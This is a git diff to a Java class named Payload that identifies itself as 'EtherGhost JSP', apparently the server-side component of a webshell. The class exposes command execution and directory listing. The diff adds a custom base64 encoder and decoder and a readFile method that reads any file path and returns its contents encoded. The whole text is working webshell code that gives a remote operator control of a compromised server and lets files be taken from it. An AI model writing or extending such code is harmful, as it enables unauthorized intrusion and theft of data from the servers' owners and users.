@@ -1,5 +1,6 @@
 import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -157,6 +158,47 @@ public class Payload {
         }
     }
 
+    public String base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+    public int base64GetShift(char c) {
+        return (c == '=' ? 0 : base64Chars.indexOf(c));
+    }
+
+    public byte[] base64Decode(String b) throws IndexOutOfBoundsException {
+        List<Byte> resultList = new ArrayList<>();
+        int blength = b.length();
+        for (int i = 0; i < blength; i += 4) {
+            int x = (base64GetShift(b.charAt(i)) << 18) + (base64GetShift(b.charAt(i + 1)) << 12)
+                    + (base64GetShift(b.charAt(i + 2)) << 6)
+                    + base64GetShift(b.charAt(i + 3));
+            int count = (i + 4 < blength ? 3 : b.indexOf('=') - i - 1);
+            for (int k = 0; k < count; k++) {
+                resultList.add((byte) (x >>> (16 - k * 8)));
+            }
+        }
+        byte[] result = new byte[resultList.size()];
+        for (int i = 0; i < resultList.size(); i++) {
+            result[i] = resultList.get(i);
+        }
+        return result;
+    }
+
+    public String base64Encode(byte[] b) throws IndexOutOfBoundsException {
+        String result = "";
+        for (int i = 0; i < b.length; i += 3) {
+            int count = (i + 3 < b.length) ? 4 : (b.length - i + 1);
+            int x = 0;
+            for (int j = 0; i + j < b.length && j < 3; j++) {
+                x += (((int) b[i + j]) << (16 - 8 * j));
+            }
+            for (int j = 0; j < count; j++) {
+                result += base64Chars.charAt((x >> (18 - 6 * j)) % 64);
+            }
+            result += "=".repeat(4 - count);
+        }
+        return result;
+    }
+
     // actions:
 
     public ArrayList<String> runCommand(String command) throws IOException, IllegalArgumentException {
@@ -181,10 +223,6 @@ public class Payload {
         return dir_path;
     }
 
-    public String getPwd() {
-        return System.getProperty("user.dir");
-    }
-
     public static ArrayList<Map<String, Object>> listFiles(String dirPath) {
         ArrayList<Map<String, Object>> result = new ArrayList<>();
         File dir = new File(dirPath);
@@ -205,6 +243,24 @@ public class Payload {
         return result;
     }
 
+    public String readFile(String filePath, int max_length) throws IOException {
+        FileInputStream fis = new FileInputStream(filePath);
+        byte[] buffer = new byte[max_length];
+        int len = fis.read(buffer);
+        fis.close();
+        if (len < max_length) {
+            byte[] result = new byte[len];
+            System.arraycopy(buffer, 0, result, 0, len);
+            return base64Encode(result);
+        } else {
+            return base64Encode(buffer);
+        }
+    }
+
+    public String getPwd() {
+        return System.getProperty("user.dir");
+    }
+
     public HashMap<String, Object> ping() {
         HashMap<String, Object> map = new HashMap<>();
         map.put("name", "EtherGhost JSP");
@@ -217,6 +273,7 @@ public class Payload {
                 114514,
                 "and this"
         });
+        map.put("test_base64", base64Encode("idk, maybe v0.0.0.1".getBytes()));
         return map;
     }
 
